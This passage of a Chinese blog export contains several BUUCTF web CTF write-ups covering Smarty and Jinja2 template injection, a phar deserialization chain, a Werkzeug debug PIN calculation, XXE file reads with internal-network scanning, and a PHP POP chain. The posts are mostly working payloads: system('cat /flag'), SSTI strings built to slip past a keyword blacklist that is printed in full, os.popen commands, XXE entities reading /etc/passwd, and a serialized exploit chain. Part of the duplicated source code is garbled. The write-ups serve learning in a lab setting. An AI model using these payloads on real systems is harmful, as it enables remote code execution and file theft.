    <content type="text"><![CDATA[考点：SSTI题以为这道题跟ikun那道题一样，考的知识点很多，是我想得复杂了。 分析 其实打开这张页面，我并不知道这道题是什么类型。只好先用bp去请求这两个接口。请求xff的时候，我添加了 xff头，值为127.0.0.1。回显了127.0.0.1。我就猜到是模板注入题了，加上页面上的关键字 Smarty，Smarty模板注入题，找了几个payload，没什么过滤，直接就回显了。 1&#123;$smarty.version&#125; 1&#123;system(&apos;cat /flag&apos;)&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web1】Dropbox 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox%201%2F</url>
    <content type="text"><![CDATA[考点：文件下载、反序列化题：使用利用phar://在file_get_contents读取文件这个题照着别人wp做下来，还是有很多地方不懂，有点害怕审计代码，一连好几个文件，看来看去的，也看不太懂，很懵的感觉。这道题的后端操作，都抽象成了三个大类，保存在class.php文件中，在index.html、login.php这些页面，基本上就是包含了class.php 文件，很多操作就直接调用类方法，代码审计弱鸡的我自然看起来就费劲，不管怎样，还是总结下做题的流程。 分析经过注册、登录，上传文件。直接来第一个关键的地方。 经过一番操作后，发现存在文件下载漏洞，在点击下载功能后，进行抓包，会得到文件的内容，这里对index.php 进行了尝试，也直接得到了index.php 的源代码。 至于这里为什么要加 ../../ 两个回退。是因为在别人的wp中看到。 接下来，开始读取相关文件的源代码进行代码审计。 读取了6个文件的源代码，index.php 显示上传的文件，register.php 注册用户，login.php 登录，upload.php 文件上传，download.php 文件下载，delete.php 文件删除，class.php 为 基类，提供了三个大类，User、FileList、File 。其他的文件都是调用 class.php 里的方法，相当于把所有的方法都放在了class.php 的类中。 接下来贴几个关键的代码。 upload.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546session_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;include "class.php";if (isset($_FILES["file"])) &#123; $filename = $_FILES["file"]["name"]; $pos = strrpos($filename, "."); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = ".gif"; switch ($_FILES["file"]["type"]) &#123; case 'image/gif': $fileext = ".gif"; break; case 'image/jpeg': $fileext = ".jpg"; break; case 'image/png': $fileext = ".png"; break; default: $response = array("success" =&gt; false, "error" =&gt; "Only gif/jpg/png allowed"); Header("Content-type: application/json"); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION['sandbox'] . $filename . $fileext; move_uploaded_file($_FILES["file"]["tmp_name"], $dst); $response = array("success" =&gt; true, "error" =&gt; ""); Header("Content-type: application/json"); echo json_encode($response); &#125; else &#123; $response = array("success" =&gt; false, "error" =&gt; "Invaild filename"); Header("Content-type: application/json"); echo json_encode($response); &#125;&#125;?&gt; download.php 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include "class.php";ini_set("open_basedir", getcwd() . ":/etc:/tmp"); // 值chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, "flag") === false) &#123; Header("Content-type: application/octet-stream"); Header("Content-Disposition: attachment; filename=" . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo "File not exist";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include "class.php";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header("Content-type: application/json"); $response = array("success" =&gt; true, "error" =&gt; ""); echo json_encode($response);&#125; else &#123; Header("Content-type: application/json"); $response = array("success" =&gt; false, "error" =&gt; "File not exist"); echo json_encode($response);&#125;?&gt; 最核心的 class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = "127.0.0.1";$dbuser = "root";$dbpass = "root";$dbname = "dropbox";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"); $stmt-&gt;bind_param("s", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . "SiAchGHmFx"); $stmt = $this-&gt;db-&gt;prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"); $stmt-&gt;bind_param("ss", $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . "SiAchGHmFx"); $stmt = $this-&gt;db-&gt;prepare("SELECT `password` FROM `users` WHERE `username` = ?;"); $stmt-&gt;bind_param("s", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(".", $filenames); unset($filenames[$key]); $key = array_search("..", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = '&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) &#123; $table .= '&lt;th scope="col" class="text-center"&gt;' . htmlentities($func) . '&lt;/th&gt;'; &#125; $table .= '&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) &#123; $table .= '&lt;td class="text-center"&gt;' . htmlentities($value) . '&lt;/td&gt;'; &#125; $table .= '&lt;td class="text-center" filename="' . htmlentities($filename) . '"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; 就是上面这些看起来费劲，理解不了。 这里就直接贴 制作phar 代码。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass User&#123; public $db; public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class FileList&#123; private $files; private $results; private $funcs; public function __construct() &#123; $this-&gt;files = array(new File()); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;class File&#123; public $filename = '/flag.txt';&#125;$user = new User();@unlink("test.phar");$phar = new Phar("test.phar");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub("GIF98a&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', "test");# 签名自动计算$phar-&gt;stopBuffering(); 把生成的 test.phar 改成 test.gif ，然后上传 成功后 抓删除的包 1phar://test.gif phar:// 协议在读取 phar文件时，会有进行反序列化的操作，当我们把序列化的内容放在setMetadata 中，再用phar:// 协议去读取，就会反序列化里面的内容。 在file_get_contents 函数中 用 phar:// 读取 phar文件 的演示这是仿照别人wp构造的两个类，然后用file_get_contents 来读取 自己制作的phar文件 demo1.php 12345678910111213141516171819202122232425&lt;!-- 使用phar://进行反序列序列化-3--&gt;&lt;?phpclass Demo1&#123; public $sub; public function __construct($sub) &#123; $this-&gt;sub = $sub; &#125;&#125;class Demo2&#123; public $s; public function __construct($s) &#123; $this-&gt;s = $s; &#125; public function __destruct() &#123; // TODO: Implement __destruct() method. eval($this-&gt;s); &#125;&#125;file_get_contents('phar://demo1.phar');?&gt; demo2.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!-- 使用phar://进行反序列序列化-2--&gt;&lt;?phpclass Demo1&#123; public $sub; public function __construct() &#123; $this-&gt;sub = new Demo2('phpinfo();'); &#125;&#125;class Demo2&#123; public $s; public function __construct($s) &#123; $this-&gt;s = $s; &#125; public function __destruct() &#123; // TODO: Implement __destruct() method. eval($this-&gt;s); &#125;&#125;$user = new Demo1();@unlink("demo1.phar");$phar = new Phar("demo1.phar");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub("GIF98a&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', "test");# 签名自动计算$phar-&gt;stopBuffering();?&gt; 执行demo1 的时候会输出]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GYCTF2020】FlaskApp 1]]></title>
    <url>%2F2021%2F04%2F19%2F%5BGYCTF2020%5DFlaskApp%201%2F</url>
    <content type="text"><![CDATA[SSIT题第一种方式：绕过waf读取保存flag的文件读取app.py源代码的payload 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config[&amp;#39;SECRET_KEY&amp;#39;] = &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39; bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&amp;#39;BASE64加密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) class NameForm1(FlaskForm): text = StringField(&amp;#39;BASE64解密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;失败乃成功之母！！&amp;#34; return render_template(&amp;#34;hint.html&amp;#34;,txt = txt) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def encode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64encode(text.encode()) tmp = &amp;#34;结果 :&#123;0&#125;&amp;#34;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&amp;#39;encode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm(text) return render_template(&amp;#34;index.html&amp;#34;,form = form ,method = &amp;#34;加密&amp;#34; ,img = &amp;#34;flask.png&amp;#34;) @app.route(&amp;#39;/decode&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def decode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64decode(text.encode()) tmp = &amp;#34;结果 ： &#123;0&#125;&amp;#34;.format(text_decode.decode()) if waf(tmp) : flash(&amp;#34;no no no !!&amp;#34;) return redirect(url_for(&amp;#39;decode&amp;#39;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&amp;#39;decode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm1(text) return render_template(&amp;#34;index.html&amp;#34;,form = form, method = &amp;#34;解密&amp;#34; , img = &amp;#34;flask1.png&amp;#34;) @app.route(&amp;#39;/&amp;lt;name&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def not_found(name): return render_template(&amp;#34;404.html&amp;#34;,name = name) if __name__ == &amp;#39;__main__&amp;#39;: app.run(host=&amp;#34;0.0.0.0&amp;#34;, port=5000, debug=True)# html 解码from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField('BASE64 Æ',validators= [DataRequired()]) submit = SubmitField('Ð¤') class NameForm1(FlaskForm): text = StringField('BASE64ãÆ',validators= [DataRequired()]) submit = SubmitField('Ð¤') def waf(str): black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"] for x in black_list : if x in str.lower() : return 1 @app.route('/hint',methods=['GET']) def hint(): txt = "1%CKÍ" return render_template("hint.html",txt = txt) @app.route('/',methods=['POST','GET']) def encode(): if request.values.get('text') : text = request.values.get("text") text_decode = base64.b64encode(text.encode()) tmp = "Ó :&#123;0&#125;".format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for('encode')) else : text = "" form = NameForm(text) return render_template("index.html",form = form ,method = " Æ" ,img = "flask.png") @app.route('/decode',methods=['POST','GET']) def decode(): if request.values.get('text') : text = request.values.get("text") text_decode = base64.b64decode(text.encode()) tmp = "Ó  &#123;0&#125;".format(text_decode.decode()) if waf(tmp) : flash("no no no !!") return redirect(url_for('decode')) res = render_template_string(tmp) flash( res ) return redirect(url_for('decode')) else : text = "" form = NameForm1(text) return render_template("index.html",form = form, method = "ãÆ" , img = "flask1.png") @app.route('/&lt;name&gt;',methods=['GET']) def not_found(name): return render_template("404.html",name = name) if __name__ == '__main__': app.run(host="0.0.0.0", port=5000, debug=True) waf 过滤了 [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] 关键字 查看根目录下所有文件 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 拼接的方式绕过waf 123[&amp;#39;bin&amp;#39;, &amp;#39;boot&amp;#39;, &amp;#39;dev&amp;#39;, &amp;#39;etc&amp;#39;, &amp;#39;home&amp;#39;, &amp;#39;lib&amp;#39;, &amp;#39;lib64&amp;#39;, &amp;#39;media&amp;#39;, &amp;#39;mnt&amp;#39;, &amp;#39;opt&amp;#39;, &amp;#39;proc&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;run&amp;#39;, &amp;#39;sbin&amp;#39;, &amp;#39;srv&amp;#39;, &amp;#39;sys&amp;#39;, &amp;#39;tmp&amp;#39;, &amp;#39;usr&amp;#39;, &amp;#39;var&amp;#39;, &amp;#39;this_is_the_flag.txt&amp;#39;, &amp;#39;.dockerenv&amp;#39;, &amp;#39;app&amp;#39;] # html解码 [&apos;bin&apos;, &apos;boot&apos;, &apos;dev&apos;, &apos;etc&apos;, &apos;home&apos;, &apos;lib&apos;, &apos;lib64&apos;, &apos;media&apos;, &apos;mnt&apos;, &apos;opt&apos;, &apos;proc&apos;, &apos;root&apos;, &apos;run&apos;, &apos;sbin&apos;, &apos;srv&apos;, &apos;sys&apos;, &apos;tmp&apos;, &apos;usr&apos;, &apos;var&apos;, &apos;this_is_the_flag.txt&apos;, &apos;.dockerenv&apos;, &apos;app&apos;] 读取this_is_the_flag.txt 文件 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 第二方式：通过计算PIN码进入shell中执行命令计算PIN码的6个数据 1、运行app的用户名，/etc/passwd ​ 得到 flaskweb 2、module name 一般固定位flask.app 3、getattr(app, &quot;__name__&quot;, app.__class__.__name__)的结果。就是Flask 4、flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见。 /usr/local/lib/python3.7/site-packages/flask/app.py 5、当前网络的mac地址的十进制数。通过文件 /sys/class/net/eth0/address 读取， 02:42:ac:10:ab:40 转成10进制 2485377870656 6、机器的id 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup，序列号为1那行 1:name=systemd:/docker/8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af 0::/system.slice/containerd.service 计算PIN的模板 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ '运行app用户名', 'module name ', 'Flask', 'flask库下app.py的绝对路径',]private_bits = [ '当前网络的mac地址的十进制数', '机器的id']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', 'flask.app', 'Flask', '/usr/local/lib/python3.7/site-packages/flask/app.py',]private_bits = [ '2485377870656', '8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 得到 243-909-803 在shell 中 执行，就能拿到flag 123import osos.popen(&quot;ls -l /&quot;).read()os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI(jinja2)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NCTF2019】True XML cookbook 1]]></title>
    <url>%2F2021%2F04%2F18%2F%5BNCTF2019%5DTrue%20XML%20cookbook%201%2F</url>
    <content type="text"><![CDATA[考点：XXE扫内网题读取/etc/passwd 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 读取/flag 会报错，因为没有这个文件 XXE扫内网 读取 /etc/hosts 和 /proc/net/arp 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;file:///proc/net/arp&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 还真不少，用http://请求看看。 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;http://10.0.196.1&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 放入intruder 跑 在10.0.196.11 下找到 这道题完全是看wp做的，xxe的题做得少，只要稍微报错一点，就看不懂，xxe，外部实体注入，就是从外部引入xml格式的文件或语句到服务端执行。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【MRCTF2020】Ezpop 1]]></title>
    <url>%2F2021%2F04%2F18%2F%5BMRCTF2020%5DEzpop%201%2F</url>
    <content type="text"><![CDATA[反序列化题：POP链构造123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; # pop构造链 一般是从 可利用的地方 回溯到 可控制的地方 # 1. 可以看到 当前类有一个魔法方法 __invoke 当这个类 以调用函数的方式调用时 就会触发该方法 我们看看那个类的方法可以调用类 public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;#class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source."&lt;br&gt;"; &#125; public function __toString()&#123; # 4. Show类 的 __toString 方法 会返回一个 $this-&gt;str-&gt;source # 可以把$this-&gt;str 属性 赋值成 Test类，这样就相当于，$this-&gt;str-&gt;source Test-&gt;source 也就相当于调用了一个不存在的属性 return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; # # 3. __get 这个魔法方法要怎么被调用呢 答案是 获取一个不存在的属性或者私有属性 public function __get($key)&#123; $function = $this-&gt;p; # 2. 发现在Test 类中可以调用一个自定义函数 用构造方法来创建一个类 return $function(); &#125;&#125;if(isset($_GET['pop']))&#123; @unserialize($_GET['pop']);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 分析在Modifier 类中发现include 函数，可以通过php://filter 去读取flag.php源代码。 最终我们要通过Modifier 的 append方法去包含flag.php的源代码。在Modifier 类中找到一个魔法方法__invoke() ，这个类能控制 append 方法，触发__invoke() 这个魔法方法的方式是以调用函数的方式去调用类。而在Test类中，存在一个__get 的魔法方法，有一条语句，return $function(); 并且$function可控制。而__get 触发方式是 调用一个不存在的属性或者私有属性 时，就会触发该方法。而在Show 类中存在__toString的魔法方法，return $this-&gt;str-&gt;source; 的$this-&gt;str可控制。 构造如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var="php://filter/read=convert.base64-encode/resource=flag.php"; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;#class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;str = new Test(); $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source."&lt;br&gt;"; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source.""; &#125; public function __wakeup()&#123; if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$s1 = new Show();$s1 = new Show($s1);var_dump(urlencode(serialize($s1))); 得到 1O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A9%3A%22index.php%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D 提交 1PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezIzN2Q3ODUzLWE3NDUtNGU4OS1hODk0LTFjODA4NGJkMzBmY30iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+ 解码 在构造序列化的时候，创建了两次show对象，在之前都只是创建一次，而这里创建两次是因为创建一次的话，并不会调用到其他的类。 一道题看一天，看下来，还是有些懵的感觉。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【BJDCTF2020】EasySearch 1]]></title>
    <url>%2F2021%2F04%2F16%2F%5BBJDCTF2020%5DEasySearch%201%2F</url>
